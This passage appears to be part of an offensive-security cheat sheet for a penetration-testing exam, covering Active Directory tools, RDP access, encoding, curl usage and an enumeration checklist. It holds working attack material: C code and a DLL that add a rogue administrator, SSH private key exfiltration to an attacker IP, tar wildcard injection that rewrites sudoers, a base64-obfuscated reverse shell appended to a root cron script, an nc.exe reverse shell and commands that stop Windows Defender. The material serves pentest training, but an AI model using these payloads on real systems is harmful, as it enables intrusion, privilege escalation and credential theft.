              <h5 id="18314-other-utilities">18.3.1.4 Other Utilities</h5>
              <ul>
                <li><strong>Impacket-SUITE</strong>: very important, make sure to have it installed; <a
                    href="https://github.com/fortra/impacket/tree/master/examples">GitHub</a></li>
                <li><strong>Impacket-mssqlclient</strong>: Available within the <a
                    href="https://github.com/SecureAuthCorp/impacket">Impacket suite</a></li>
                <li><strong>Klist</strong>: <code>sudo apt install krb5-user</code></li>
                <li><strong>Kerbrute.py</strong>: Available within the BloodHound suite.</li>
                <li><strong>Ntlm-theft</strong>: <a href="https://github.com/Greenwolf/ntlm_theft">GitHub</a></li>
                <li><strong>PowerCat</strong>: <a href="https://github.com/besimorhino/powercat">GitHub</a></li>
                <li><strong>Putty Tools</strong>:
                  <code>sudo apt update &amp;&amp; sudo apt upgrade &amp;&amp; sudo apt install putty-tools</code>
                </li>
                <li><strong>Rbcd.py</strong>: <a href="https://github.com/tothi/rbcd-attack">GitHub</a> and <a
                    href="https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py">Raw</a></li>
                <li><strong>Rpcdump</strong>: Part of the BloodHound tools.</li>
              </ul>
              <h4 id="1832-windows">18.3.2 Windows</h4>
              <h5 id="18321-bloodhound-tools">18.3.2.1 BloodHound Tools</h5>
              <ul>
                <li><strong>Bloodhound.exe</strong>: <a href="https://github.com/BloodHoundAD/BloodHound">GitHub</a> -
                  Active Directory enumeration and exploitation.</li>
                <li><strong>GhostPack Compiled Binaries</strong>: <a
                    href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">GitHub</a></li>
                <li><strong>GMSAPasswordReader.exe</strong>: <a
                    href="https://github.com/rvazarkar/GMSAPasswordReader">GitHub</a> - Extract gPasswords from AD.</li>
                <li><strong>Nc.exe</strong>: <a href="https://github.com/int0x33/nc.exe/tree/master">GitHub</a></li>
                <li><strong>Rubeus.exe</strong>: <a href="https://github.com/rubeus/rubeus">GitHub</a></li>
                <li><strong>SeAbuse.exe</strong>: <a href="https://github.com/xct/SeRestoreAbuse">GitHub</a> - Example
                  usage:
                  <code>.\SeRestoreAbuse.exe &quot;C:\temp\nc.exe 192.168.49.194 445 -e powershell.exe&quot;</code>
                </li>
              </ul>
              <h5 id="18322-kerberos-tools">18.3.2.2 Kerberos Tools</h5>
              <ul>
                <li><strong>GetTGT.py</strong>: Part of the <a href="https://github.com/ropnop/kerbrute">BloodHound
                    tools</a></li>
                <li><strong>GetST.py</strong>: Part of the <a href="https://github.com/ropnop/kerbrute">BloodHound
                    tools</a></li>
                <li><strong>GetUserSPNs.py</strong>: <a
                    href="https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py">GitHub</a></li>
                <li><strong>GetNPUsers.py</strong>:<a
                    href="https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py">GitHub</a></li>
                <li><strong>Kerbrute</strong>: <a href="https://github.com/ropnop/kerbrute">GitHub</a></li>
                <li><strong>Psexec.py</strong>: Part of the <a href="https://github.com/ropnop/kerbrute">BloodHound
                    tools</a></li>
                <li><strong>TargetedKerberoast.py</strong>: <a
                    href="https://github.com/ShutdownRepo/targetedKerberoast">GitHub</a></li>
                <li><strong>Ticketer</strong>: Available within the BloodHound suite.</li>
              </ul>
              <h5 id="18323-other-utilities">18.3.2.3 Other Utilities</h5>
              <ul>
                <li><strong>AdPEAS</strong>: <a href="https://github.com/61106960/adPEAS/tree/main">GitHub</a></li>
                <li><strong>Impacket-SUITE</strong>: very important, make sure to have it installed; <a
                    href="https://github.com/fortra/impacket/tree/master/examples">GitHub</a></li>
                <li><strong>PowerMad</strong>: <a
                    href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerMad">GitHub</a></li>
                <li><strong>PowerView</strong>: <a
                    href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">GitHub</a></li>
                <li><strong>PowerUp</strong>: <a
                    href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp">GitHub</a></li>
                <li><strong>PrivescCheck</strong>: <a
                    href="https://github.com/robertdavidgraham/PrivescCheck">GitHub</a>
                </li>
                <li><strong>Seatbelt</strong>: <a href="https://github.com/GhostPack/Seatbelt">GitHub</a></li>
                <li><strong>WinPEAS</strong>: <a
                    href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">GitHub</a>
                </li>
              </ul>
              <h3 id="184-connect-to-rdp">18.4 Connect to RDP</h3>
              <h4 id="1841-using-credentials">18.4.1 Using Credentials</h4>
              <pre><code class="language-bash">xfreerdp /compression +auto-reconnect /u:[user] /p:&#39;[password]&#39; /v:[IP] +clipboard /size:1920x1080 /drive:desktop,/home/[your_username]/Desktop
</code></pre>
              <h4 id="1842-using-hashes">18.4.2 Using Hashes</h4>
              <pre><code class="language-bash"># Using an NTLM hash.
xfreerdp /size:1920x1080 /v:[IP] /u:[user] /H:[hash] /cert:ignore /dynamic-resolution
</code></pre>
              <h4 id="1843-prompt-for-credentials">18.4.3 Prompt for Credentials</h4>
              <pre><code class="language-bash"># Useful when GUI is required for attacks.
rdesktop [IP]
</code></pre>
              <h4 id="1844-general-rdp-connect">18.4.4 General RDP Connect</h4>
              <p><strong>xfreerdp</strong></p>
              <pre><code class="language-bash"># Connect with a username and password
xfreerdp /size:1920x1080 /u:[user] /p:[password] /v:[host/ip] /drive:desktop,/home/[your_username]/Desktop
</code></pre>
              <p><strong>rdesktop</strong></p>
              <pre><code class="language-bash"># Connect with specified dimensions and credentials
rdesktop [IP] -u [user] -p [password] -g 80%+150+100
</code></pre>
              <h4 id="1845-enable-rdp-if-disabled">18.4.5 Enable RDP If Disabled</h4>
              <p>Check <strong>RDP Status</strong></p>
              <pre><code class="language-powershell">$ComputerName = hostname
(Get-WmiObject -class &quot;Win32_TSGeneralSetting&quot; -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter &quot;TerminalName=&#39;RDP-tcp&#39;&quot;).UserAuthenticationRequired
# If result is 1 then RDP is disabled

# Set the NLA information to Disabled to allow RDP
(Get-WmiObject -class &quot;Win32_TSGeneralSetting&quot; -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter &quot;TerminalName=&#39;RDP-tcp&#39;&quot;).SetUserAuthenticationRequired(0)

# Set the NLA information to Enabled to deny RDP
(Get-WmiObject -class &quot;Win32_TSGeneralSetting&quot; -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter &quot;TerminalName=&#39;RDP-tcp&#39;&quot;).SetUserAuthenticationRequired(1)
</code></pre>
              <p><strong>Enabled it for the whole workstation</strong></p>
              <pre><code class="language-powershell">Set-ItemProperty -Path &#39;HKLM:\System\CurrentControlSet\Control\Terminal Server&#39; -name &quot;fDenyTSConnections&quot; -value 0
</code></pre>
              <p><strong>Enabled it for an Specific User (No Active Directory)</strong></p>
              <pre><code class="language-powershell">Add-LocalGroupMember -Group &quot;Remote Desktop Users&quot; -Member &quot;[username]&quot;
</code></pre>
              <p><strong>Enabled it for an Specific User (Active Directory)</strong></p>
              <pre><code class="language-powershell"># Option 1: Using Ad User
Add-ADGroupMember -Identity &quot;Remote Desktop Users&quot; -Members &quot;[domain]\[username]&quot;

# Option 2: Using net
net localgroup &quot;Remote Desktop Users&quot; &quot;[domain]\[username]&quot; /add
</code></pre>
              <p><strong>Check the Firewall Status</strong></p>
              <pre><code class="language-powershell"># This is done because if a firewall is configured, it may cause issues for our RDP

# Get status: if True the rule is enabled and RDP should work
Get-NetFirewallRule -DisplayGroup &quot;Remote Desktop&quot;

# Enabled if it&#39;s disabled, ensures traffic via port 3389 is not blocked
Enable-NetFirewallRule -DisplayGroup &quot;Remote Desktop&quot;
</code></pre>
              <p>(Alternative) <strong>Create a new user for RDP</strong>, needs to be admin already</p>
              <pre><code class="language-powershell"># 1. Create the new user
New-ADUser -Name &quot;[username]&quot; -AccountPassword (ConvertTo-SecureString &quot;P@ssword123!&quot; -AsPlainText -Force) -Enabled $true

# 2. Confirm that it was created successfully (should appear in the list)
Get-NetUser | select cn

# 3. Add user to RDP group, must be run being admin
Add-ADGroupMember -Identity &quot;Remote Management Users&quot; -Members [username]

# 4. Add user to Adinistrators group, must be run being admin
Add-ADGroupMember -Identity &quot;Administrators&quot; -Members [username]

# 5. Enable RDP Usage
Set-ItemProperty -Path &#39;HKLM:\System\CurrentControlSet\Control\Terminal Server&#39;-name &quot;fDenyTSConnections&quot; -Value 0
Enable-NetFirewallRule -DisplayGroup &quot;Remote Desktop&quot;

# 6. Connect to RDP
rdesktop -u [username] -p &#39;P@ssword123!&#39; -d [domain.com] [victim_ip]
</code></pre>
              <h3 id="185-decoding-techniques">18.5 Decoding Techniques</h3>
              <p><strong>ASCII to Text</strong></p>
              <pre><code class="language-bash"># Decode
echo &quot;72 101 108 108 111&quot; | awk &#39;{for(i=1;i&lt;=NF;i++) printf(&quot;%c&quot;,$i)}&#39;

# Encode
echo -n &quot;Hello&quot; | od -An -t uC | tr -d &#39; \n&#39;
</code></pre>
              <p><strong>Base64</strong></p>
              <pre><code class="language-bash"># Decode
echo &quot;SGVsbG8gd29ybGQ=&quot; | base64 -d

# Encode
echo &quot;Hello world&quot; | base64
</code></pre>
              <p><strong>Hexadecimal</strong></p>
              <pre><code class="language-bash"># Decode
echo &quot;48656c6c6f20776f726c64&quot; | xxd -r -p

# Encode
echo &quot;Hello world&quot; | xxd -p
</code></pre>
              <p><strong>Reverse a String</strong></p>
              <pre><code class="language-bash"># Decode
echo &quot;dlrow olleH&quot; | rev

# Encode
echo &quot;Hello world&quot; | rev
</code></pre>
              <p><strong>ROT13</strong></p>
              <pre><code class="language-bash"># Decode
echo &quot;Uryyb jbeyq&quot; | tr &#39;A-Za-z&#39; &#39;N-ZA-Mn-za-m&#39;

# Encode
echo &quot;Hello world&quot; | tr &#39;A-Za-z&#39; &#39;N-ZA-Mn-za-m&#39;
</code></pre>
              <p><strong>URL</strong></p>
              <pre><code class="language-bash"># Decode
echo &quot;Hello%20World%21&quot; | python3 -c &quot;import urllib.parse, sys; print(urllib.parse.unquote(sys.stdin.read().strip()))&quot;

# Encode
echo &quot;Hello World!&quot; | python3 -c &quot;import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read().strip()))&quot;
</code></pre>
              <h3 id="186-curl-usage">18.6 Curl Usage</h3>
              <h4 id="1861-basic-requests">18.6.1 Basic Requests</h4>
              <ul>
                <li><strong>GET Request</strong></li>
              </ul>
              <pre><code class="language-bash">curl http://example.com
</code></pre>
              <ul>
                <li><strong>GET Request with Custom Headers</strong></li>
              </ul>
              <pre><code class="language-bash">curl -H &quot;Accept: application/json&quot; http://example.com
</code></pre>
              <h4 id="1862-data-submission">18.6.2 Data Submission</h4>
              <ul>
                <li><strong>POST Request with Form Data</strong></li>
              </ul>
              <pre><code class="language-bash">curl -X POST -d &quot;param1=value1&amp;param2=value2&quot; http://example.com/submit
</code></pre>
              <ul>
                <li><strong>POST Request with JSON Data</strong></li>
              </ul>
              <pre><code class="language-bash">curl -H &quot;Content-Type: application/json&quot; -X POST -d &#39;{&quot;key1&quot;:&quot;value1&quot;, &quot;key2&quot;:&quot;value2&quot;}&#39; http://example.com/api
</code></pre>
              <ul>
                <li><strong>Automatically Perform URL Encoding</strong></li>
              </ul>
              <pre><code class="language-shell">curl -X POST -d &quot;param1=value1&amp;param2=value2&quot; --data-urlencode http://example.com/submit
</code></pre>
              <ul>
                <li><strong>PUT Request with Form Data</strong></li>
              </ul>
              <pre><code class="language-bash">curl -X PUT -d &quot;param1=value1&amp;param2=value2&quot; http://example.com/update
</code></pre>
              <ul>
                <li><strong>DELETE Request</strong></li>
              </ul>
              <pre><code class="language-bash">curl -X DELETE http://example.com/delete
</code></pre>
              <h4 id="1863-authentication-and-headers">18.6.3 Authentication and Headers</h4>
              <ul>
                <li><strong>Basic Authentication</strong></li>
              </ul>
              <pre><code class="language-bash">curl -u username:password http://example.com
</code></pre>
              <ul>
                <li><strong>Custom User-Agent</strong></li>
              </ul>
              <pre><code class="language-bash">curl -A &quot;CustomUserAgent/1.0&quot; http://example.com
</code></pre>
              <h4 id="1864-response-handling">18.6.4 Response Handling</h4>
              <ul>
                <li><strong>Include Response Headers</strong></li>
              </ul>
              <pre><code class="language-bash">curl -i http://example.com
</code></pre>
              <ul>
                <li><strong>Save Response to File</strong></li>
              </ul>
              <pre><code class="language-bash">curl -o filename.html http://example.com
</code></pre>
              <ul>
                <li><strong>Show Response Headers Only</strong></li>
              </ul>
              <pre><code class="language-bash">curl -I http://example.com
</code></pre>
              <ul>
                <li><strong>Print Response Body Only</strong></li>
              </ul>
              <pre><code class="language-bash">curl -s http://example.com
</code></pre>
              <ul>
                <li><strong>Show Detailed Request and Response</strong></li>
              </ul>
              <pre><code class="language-bash">curl -v http://example.com
</code></pre>
              <h4 id="1865-cookies-and-session-management">18.6.5 Cookies and Session Management</h4>
              <ul>
                <li><strong>Send Cookies</strong></li>
              </ul>
              <pre><code class="language-bash">curl -b &quot;cookie1=value1; cookie2=value2&quot; http://example.com
</code></pre>
              <ul>
                <li><strong>Save Cookies to File</strong></li>
              </ul>
              <pre><code class="language-bash">curl -c cookies.txt http://example.com
</code></pre>
              <ul>
                <li><strong>Load Cookies from File</strong></li>
              </ul>
              <pre><code class="language-bash">curl -b cookies.txt http://example.com
</code></pre>
              <h4 id="1866-file-operations">18.6.6 File Operations</h4>
              <ul>
                <li><strong>Upload a File</strong></li>
              </ul>
              <pre><code class="language-bash">curl -F &quot;file=@path/to/file&quot; http://example.com/upload
</code></pre>
              <ul>
                <li><strong>Download a File with Resume Support</strong></li>
              </ul>
              <pre><code class="language-bash">curl -C - -o filename http://example.com/file
</code></pre>
              <h4 id="1867-proxy-and-security">18.6.7 Proxy and Security</h4>
              <ul>
                <li><strong>Use a Proxy</strong></li>
              </ul>
              <pre><code class="language-bash">curl -x http://proxyserver:port http://example.com
</code></pre>
              <ul>
                <li><strong>Use HTTPS and Insecure SSL</strong></li>
              </ul>
              <pre><code class="language-bash">curl -k https://example.com
</code></pre>
              <h4 id="1868-additional-options">18.6.8 Additional Options</h4>
              <ul>
                <li><strong>Follow Redirects</strong></li>
              </ul>
              <pre><code class="language-bash">curl -L http://example.com
</code></pre>
              <ul>
                <li><strong>Set Timeout</strong></li>
              </ul>
              <pre><code class="language-bash">curl --max-time 30 http://example.com
</code></pre>
              <ul>
                <li><strong>Show Only Response Code</strong></li>
              </ul>
              <pre><code class="language-bash">curl -s -o /dev/null -w &quot;%{http_code}&quot; http://example.com
</code></pre>
              <ul>
                <li><strong>Use HTTP/2</strong></li>
              </ul>
              <pre><code class="language-bash">curl --http2 http://example.com
</code></pre>
              <h3 id="187-generate-a-ssh-key">18.7 Generate a SSH Key</h3>
              <ol>
                <li><strong>Generate SSH Key Pair</strong> <em>(Run on the victim machine)</em>:</li>
              </ol>
              <pre><code class="language-bash">ssh-keygen -t rsa -b 4096 -f /tmp/id_rsa -N &#39;&#39;
</code></pre>
              <ol start="2">
                <li><strong>Set Up a Web Server on the Attacker Machine</strong> <em>(Run on the attacker Kali
                    machine)</em>:</li>
              </ol>
              <pre><code class="language-bash">python3 -m http.server 80
</code></pre>
              <ol start="3">
                <li><strong>Upload the Private Key to the Attacker Machine</strong> <em>(Run on the victim
                    machine)</em>:</li>
              </ol>
              <pre><code class="language-bash">curl -T /tmp/id_rsa http://&lt;attacker_ip&gt;/id_rsa
</code></pre>
              <ol start="4">
                <li><strong>Clean Up SSH Key Files</strong> <em>(Run on the victim machine)</em>:</li>
              </ol>
              <pre><code class="language-bash"># Remove the key files from the victim machine to avoid leaving sensitive files.
rm /tmp/id_rsa /tmp/id_rsa.pub
</code></pre>
              <ol start="5">
                <li><strong>Download the Private Key on the Attacker Machine</strong> <em>(Run on the attacker Kali
                    machine)</em>:</li>
              </ol>
              <pre><code class="language-bash"># Replace &lt;victim_ip&gt; with the IP address where the private key was uploaded.
wget http://&lt;victim_ip&gt;/id_rsa
</code></pre>
              <ol start="6">
                <li><strong>Set Permissions for the Private Key</strong> <em>(Run on the attacker Kali machine)</em>:
                </li>
              </ol>
              <pre><code class="language-bash">chmod 600 id_rsa
</code></pre>
              <ol start="7">
                <li><strong>Connect Using SSH</strong> <em>(Run on the attacker Kali machine)</em>:</li>
              </ol>
              <pre><code class="language-bash">ssh -i id_rsa user@&lt;victim_ip&gt;
</code></pre>
              <h3 id="188-cross-compiling-for-windows">18.8 Cross Compiling for Windows</h3>
              <p><strong>Create an Executable That Adds a New Administrator User</strong></p>
              <pre><code class="language-c">#include &lt;stdlib.h&gt;

int main ()
{
  system(&quot;net user emma Password123! /add&quot;);
  system(&quot;net localgroup administrators emma /add&quot;);
  return 0;
}</code></pre>
              <p><strong>Create a DLL That Adds a New Administrator User</strong></p>
              <pre><code class="language-c">#include &lt;windows.h&gt;  
#include &lt;stdlib.h&gt;  

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
  switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
      // Code executed when the DLL is injected
      system(&quot;net user emma Password123! /add&quot;);
      system(&quot;net localgroup administrators emma /add&quot;);
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    case DLL_PROCESS_DETACH:
      break;
  }
  return TRUE; // Indicate successful execution
}</code></pre>
              <p><strong>Compile the Code for 64-bit</strong></p>
              <pre><code class="language-bash"># Cross-Compile the C Code to a 64-bit Application
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

# Cross-Compile the C Code to a DLL
x86_64-w64-mingw32-gcc -shared -o adduser.dll adduser.c -Wl,--subsystem,windows</code></pre>
              <h3 id="189-managing-flags">18.9 Managing Flags</h3>
              <p><strong>Find Local Flag Location</strong></p>
              <pre><code class="language-bash">find / -type f -name local.txt 2&gt;/dev/null
</code></pre>
              <p><strong>Retrieve Flags Correctly</strong>: flags must be retrieved using an interactive shell,
                <em>webshells are not valid</em>.
              </p>
              <pre><code class="language-bash"># Linux
hostname &amp;&amp; whoami &amp;&amp; cat proof.txt &amp;&amp; ip a 

# Windows
hostname &amp;&amp; whoami &amp;&amp; type [local/proof].txt &amp;&amp; ipconfig /all
</code></pre>
              <h3 id="1810-additional-tips">18.10 Additional Tips</h3>
              <p><strong>Change File Ownership</strong></p>
              <pre><code class="language-bash"># Example file ownership before change
ls -l id_rsa
# Output: -rw------- 1 root root 3381 Sep 24 2020 id_rsa

# Change file ownership to a new user
sudo chown &lt;new_owner&gt; &lt;file_name&gt;

# Example file ownership after change
ls -l id_rsa
# Output: -rw------- 1 &lt;new_owner&gt; root 3381 Sep 24 2020 id_rsa
</code></pre>
              <p><strong>Change User Permissions</strong></p>
              <pre><code class="language-bash"># Add a user to a group
sudo usermod -aG &lt;group_name&gt; &lt;username&gt;
</code></pre>
              <p><strong>Extract Metadata</strong></p>
              <pre><code class="language-bash">exiftool -a -u [file.extension]
</code></pre>
              <p><strong>Find Hash Type</strong></p>
              <pre><code class="language-bash">hashid [hash]
</code></pre>
              <p><strong>Important Wordlists</strong>:</p>
              <ul>
                <li><code>xato-net-10-million-usernames.txt</code></li>
              </ul>
              <p><strong>Modify <code>/etc/sudoers</code> via tar</strong></p>
              <pre><code class="language-bash"># The idea is to have the sudoers file with this line: emma ALL=(root) NOPASSWD: ALL

cd /tmp
touch payload.sh
echo &quot;echo &#39;james ALL=(root) NOPASSWD: ALL&#39; &gt; /etc/sudoers&quot; &gt; payload.sh # Or use nano to add the file if possible
echo &quot;&quot; &gt; &#39;--checkpoint=1&#39;
echo &quot;&quot; &gt; &#39;--checkpoint-action=exec=sh payload.sh&#39;
# The below command is possible because we checked sudo -l and saw the permission tar for the user.
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
# After this we can check with sudo -l and should see the line:     (root) NOPASSWD: ALL. The access the root shell
sudo /bin/bash
</code></pre>
              <p><strong>Save Private Key with Unstable Reverse Shell</strong>:</p>
              <pre><code class="language-bash">echo &quot;-----BEGIN OPENSSH PRIVATE KEY----- ... -----END OPENSSH PRIVATE KEY-----&quot; &gt; /tmp/id_rsa
</code></pre>
              <p><strong>Search for Passwords in PHP Files</strong>:</p>
              <pre><code class="language-bash">find [directoryPath] -maxdepth 5 -name &quot;*.php&quot; -exec grep -Hni &quot;password&quot; {} \; 2&gt;/dev/null
</code></pre>
              <p><strong>Upgrade to Root Shell with Script</strong>:</p>
              <pre><code class="language-bash"># Shen found a script owned and run by root but writable for us

# At target machine  
echo -n &quot;chmod u+s /bin/bash&quot; | base64  
echo &quot;echo -n &#39;Y2htb2QgdStzIC9iaW4vYmFzaA==&#39;|base64 -d|bash&quot; &gt;&gt; /var/backups/etc_Backup.sh  

#wait for a few second  
ls -al /bin/bash  
/bin/bash -p  

#You can use other payload as well such as  
echo -n &quot;sh -i &gt;&amp; /dev/tcp/$KaliIP/80 0&gt;&amp;1&quot; | base64  
echo &quot;echo -n &#39;c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xNzYvODAgMD4mMQ==&#39;|base64 -d|bash&quot; &gt;&gt; /var/backups/etc_Backup.sh
</code></pre>
              <p><strong>Useful Windows Commands</strong></p>
              <pre><code class="language-powershell"># Find a file
locate &lt;FILE&gt;
find / -name &quot;&lt;FILE&gt;&quot;

# Show Active Connections
netstat -lntp

# List all SUID files
find / -perm -4000 2&gt;/dev/null

# Determine version of Linux
cat /etc/issue
uname -a

# List running processes
ps -faux

Get-ChildItem -Path C:\Users\ -Include *.* -File -Recurse -ErrorAction SilentlyContinue

# Shows only hidden files
Dir -Hidden

# Shows all files (including hidden)
Dir -Force

dir /s pass == cred == vnc == .config
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Disable windows defender
sc stop WinDefend

# Bypass restriction
powershell -nop -ep bypass

# List hidden files
dir /a

# Find a file
dir /b/s &quot;&lt;FILE&gt;&quot;
</code></pre>
              <p><strong>User and Permissions Management</strong></p>
              <pre><code class="language-bash"># Create a new group with a specific GID
sudo groupadd -g &lt;gid&gt; &lt;group_name&gt;

# Create a new user with a specific UID and GID
sudo useradd -u &lt;uid&gt; -g &lt;gid&gt; &lt;username&gt;

# Set a password for the new user
sudo passwd &lt;username&gt;
</code></pre>
              <p><strong>Updating the PATH Variable</strong></p>
              <pre><code class="language-bash"># Linux
export PATH=&quot;$PATH:/usr/local/bin:/usr/bin:/bin&quot;

# Windows
set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
</code></pre>
              <h2 id="19-strategy">19. <span class="emoji">‚ôüÔ∏è</span> Methodology</h2>
              <h3 id="191-services">19.1 Services</h3>
              <h4 id="1911-initial-scanning">19.1.1 Initial Scanning</h4>
              <ul>
                <li><input type="checkbox" data-id="nmap-enum"> Nmap Advanced Enumeration for each service</li>
                <li><input type="checkbox" data-id="entry-point-list"> <strong>Make a List of Every Entry Point</strong>
                </li>
              </ul>

              <h4 id="1912-general-methodology">19.1.2 General Methodology</h4>
              <ul>
                <li><input type="checkbox" data-id="general-enumerate"> <strong>Enumerate</strong>:
                  <ul>
                    <li><input type="checkbox" data-id="banner-grab"> Banner Grabbing
                      <ul>
                        <li><input type="checkbox" data-id="nc-banner-grab"> Netcat: <code>nc -v [ip] [port]</code></li>
                        <li><input type="checkbox" data-id="telnet-banner-grab"> Telnet: <code>telnet [ip] [port]</code>
                        </li>
                      </ul>
                    </li>
                    <li><input type="checkbox" data-id="version"> Version</li>
                    <li><input type="checkbox" data-id="vuln-enum"> Vulnerabilities: do it with Banner Grabbing with
                      Netcat or Telnet</li>
                    <li><input type="checkbox" data-id="hacktricks-ref"> If you do not know how to enumerate a service
                      use
                      HackTricks</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="general-consider"> <strong>Consider</strong>:
                  <ul>
                    <li><input type="checkbox" data-id="service-purpose"> Service purpose: Is it
                      readable/modifiable/decryptable?</li>
                    <li><input type="checkbox" data-id="password-change"> Can we change password or users from other
                      services around?</li>
                    <li><input type="checkbox" data-id="modify-info"> Can we modify information?</li>
                    <li><input type="checkbox" data-id="read-info"> Can we read information?</li>
                    <li><input type="checkbox" data-id="decrypt-info"> Can we decrypt it?</li>
                    <li><input type="checkbox" data-id="default-creds"> Default credentials and brute-force
                      possibilities.
                    </li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="general-brute"> <strong>Brute-Force</strong>:
                  <ul>
                    <li><input type="checkbox" data-id="brute-default-creds"> Default credentials: use
                      <code>creds</code>
                    </li>
                    <li><input type="checkbox" data-id="nse-scripts"> NSE Scripts</li>
                    <li><input type="checkbox" data-id="hydra"> Hydra</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="known-vulns"> <strong>Known vulnerabilities</strong> and
                  misconfigurations:
                  <ul>
                    <li><input type="checkbox" data-id="exploit-db"> Check <a
                        href="https://www.exploit-db.com/">exploit-db.com/</a></li>
                    <li><input type="checkbox" data-id="cve-details"> Check <a
                        href="https://www.cvedetails.com/">cvedetails.com</a></li>
                    <li><input type="checkbox" data-id="nvd"> Check <a href="https://nvd.nist.gov/">nvd.nist.gov/</a>
                    </li>
                    <li><input type="checkbox" data-id="google-search"> Check on Google:
                      <ul>
                        <li><input type="checkbox" data-id="google-gh-service">
                          <code>site:github.com *Service version.release</code>
                        </li>
                        <li><input type="checkbox" data-id="google-exploit-search">
                          <code>version + github + exploit search</code>
                        </li>
                        <li><input type="checkbox" data-id="error-messages"> Every error message</li>
                        <li><input type="checkbox" data-id="paths"> Every PATH</li>
                        <li><input type="checkbox" data-id="params"> Every parameter to find version</li>
                        <li><input type="checkbox" data-id="exploitdb-versions"> Every version of exploitdb</li>
                        <li><input type="checkbox" data-id="vuln-versions"> Every version of vuln</li>
                        <li><input type="checkbox" data-id="banner-strings"> Every string from the banner grabber</li>
                      </ul>
                    </li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="credentials"> <strong>Credentials</strong>
                  <ul>
                    <li><input type="checkbox" data-id="try-popular-creds"> Try popular credentials
                      <ul>
                        <li><input type="checkbox" data-id="admin-admin"> <code>admin:admin</code></li>
                        <li><input type="checkbox" data-id="admin-password"> <code>admin:password</code></li>
                        <li><input type="checkbox" data-id="root-admin"> <code>root:admin</code></li>
                        <li><input type="checkbox" data-id="root-password"> <code>root:password</code></li>
                        <li><input type="checkbox" data-id="root-root"> <code>root:root</code></li>
                        <li><input type="checkbox" data-id="boxname-admin"> <code>[boxname]:admin</code></li>
                        <li><input type="checkbox" data-id="boxname-password"> <code>[boxname]:password</code></li>
                        <li><input type="checkbox" data-id="appname-appname"> <code>[appName]:[appName]</code></li>
                        <li><input type="checkbox" data-id="admin-nopass"> <code>admin:no pass</code></li>
                        <li><input type="checkbox" data-id="root-nopass"> <code>root:no pass</code></li>
                      </ul>
                    </li>
                    <li><input type="checkbox" data-id="word-alts"> Try different words than password, e.g.,
                      <code>pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret</code>
                    </li>
                    <li><input type="checkbox" data-id="creds-tool"> Try default credentials using <code>creds</code>
                      tool
                    </li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="code-files-review"> <strong>Code and Files Review</strong>
                  <ul>
                    <li><input type="checkbox" data-id="db-creds"> Credentials for mysql, postgresql, and mssql: look
                      for
                      string <code>sa</code></li>
                    <li><input type="checkbox" data-id="office2john"> Doc: <code>office2john</code></li>
                    <li><input type="checkbox" data-id="exes-review"> EXEs:
                      <ul>
                        <li><input type="checkbox" data-id="exe-strings"> <code>strings</code></li>
                        <li><input type="checkbox" data-id="exe-floss"> <code>flare-floss</code></li>
                        <li><input type="checkbox" data-id="buffer-overflow"> Buffer Overflow</li>
                      </ul>
                    </li>
                    <li><input type="checkbox" data-id="jpgs"> JPGs:
                      <ul>
                        <li><input type="checkbox" data-id="jpgs-wget"> <code>wget</code> for downloading files to keep
                          original timestamps and file information.</li>
                        <li><input type="checkbox" data-id="jpgs-hidden-content"> Check image files for hidden content:
                        </li>
                        <li><input type="checkbox" data-id="jpgs-binwalk"> <code>binwalk</code></li>
                        <li><input type="checkbox" data-id="jpgs-strings"> <code>strings</code></li>
                        <li><input type="checkbox" data-id="jpgs-steghide"> <code>steghide</code></li>
                      </ul>
                    </li>
                    <li><input type="checkbox" data-id="pcaps-wireshark"> PCAPs (Packet Inspection):
                      <code>wireshark</code>
                    </li>
                    <li><input type="checkbox" data-id="pdfs"> PDFs:
                      <ul>
                        <li><input type="checkbox" data-id="pdfs-exiftool"> <code>exiftool</code></li>
                        <li><input type="checkbox" data-id="pdfs-pdfcrack"> <code>pdfcrack</code></li>
                      </ul>
                    </li>
                    <li><input type="checkbox" data-id="pngs-exiftool"> PNGs: <code>exiftool</code></li>
                    <li><input type="checkbox" data-id="zips-zip2john"> ZIPs: <code>zip2john</code></li>
                    <li><input type="checkbox" data-id="7z-7z2john"> 7z: <code>7z2john</code></li>
                    <li><input type="checkbox" data-id="dotnet-dnspy"> .NET: <code>dnSpy</code></li>
                    <li><input type="checkbox" data-id="google-search"> Look for the file specifically on google.com and
                      how to decrypt them
                      <ul>
                        <li><input type="checkbox" data-id="google-groups"> Groups.xml: <code>gpp decrypt</code></li>
                        <li><input type="checkbox" data-id="google-vnc"> VNC: <code>vncpwd</code></li>
                      </ul>
                    </li>
                    <li><input type="checkbox" data-id="review-config"> Review configuration files and databases
                      <ul>
                        <li><input type="checkbox" data-id="db-sqlite"> DB: <code>sqlite</code></li>
                        <li><input type="checkbox" data-id="config-conf"> <code>.conf</code></li>
                        <li><input type="checkbox" data-id="config-config"> <code>.config</code></li>
                        <li><input type="checkbox" data-id="config-xml"> <code>.xml</code></li>
                      </ul>
                    </li>
                  </ul>
                </li>
              </ul>
